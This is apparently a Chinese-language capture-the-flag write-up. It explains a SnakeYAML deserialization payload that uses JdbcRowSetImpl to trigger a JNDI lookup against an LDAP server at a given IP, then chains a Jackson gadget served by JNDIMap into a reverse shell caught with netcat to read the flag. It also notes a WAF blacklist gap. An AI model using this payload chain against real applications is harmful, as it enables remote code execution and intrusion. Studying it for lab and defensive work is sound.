### payload解释

1. **`!!com.sun.rowset.JdbcRowSetImpl`**
   - 这是SnakeYAML的**类型标签语法**（`!!`），强制解析器将后续内容实例化为`JdbcRowSetImpl`类（Java标准库中用于数据库连接的类）。
   - 此类是漏洞利用的入口点，因其`dataSourceName`属性可触发JNDI查找。
2. **`dataSourceName`属性**
   - 设置为LDAP URL：`ldap://8.138.127.74:6001/Deserialize/Jackson/ReverseShell/8.138.127.74/2333`。
   - 作用：当`autoCommit=true`时，`JdbcRowSetImpl`会尝试连接该URL，发起**JNDI查询**到攻击者控制的服务器（IP: `8.138.127.74`，端口: `6001`）。
   - URL路径解析：
     - `/Deserialize/Jackson`：指示恶意LDAP服务器使用**Jackson反序列化链**（一个已知漏洞）。
     - `/ReverseShell/8.138.127.74/2333`：指定反弹Shell的目标（攻击者VPS的IP和端口）。
3. **`autoCommit: true`**
   - 关键触发点：设置此属性为`true`会调用`setAutoCommit()`方法，该方法内部会连接`dataSourceName`指定的JNDI资源，从而激活攻击链。

### 漏洞利用流程

整个攻击分为三个阶段，Payload是**第一阶段**的触发点：

1. **SnakeYAML反序列化漏洞**

   - 应用解析用户提交的YAML内容（通过`yamlContent`参数）时，因未严格过滤类（WAF黑名单未覆盖`JdbcRowSetImpl`），实例化恶意类。
   - 触发JNDI查询到`ldap://8.138.127.74:6001`。

2. **JNDI注入 + Jackson反序列化（第二阶段）**

   - 攻击者使用`JNDIMap`工具（文档中的JAR）启动恶意LDAP服务器：

     bash

     ```
     java -jar JNDIMap-0.0.1.jar -i 8.138.127.74 -l 6001 -p 6002
     ```

     - `-l 6001`：LDAP服务端口（响应JNDI查询）。
     - `-p 6002`：HTTP服务端口（托管恶意序列化数据）。

   - 当LDAP服务器收到路径`/Deserialize/Jackson/ReverseShell/...`的查询时：

     - 返回一个**Jackson反序列化Gadget**（利用链），指向HTTP服务（`http://8.138.127.74:6002/`）。
     - 应用下载并执行该Gadget，触发Jackson反序列化漏洞。

3. **反弹Shell执行（第三阶段）**

   - Jackson反序列化Gadget包含**反向Shell代码**，连接到攻击者指定的IP和端口（`8.138.127.74:2333`）。

   - 攻击者用Netcat监听端口：

     bash

     ```
     nc -lvvp 2333
     ```

   - Shell成功连接后，执行命令（如`cat /flag`）获取Flag：`flag{cl---}`。
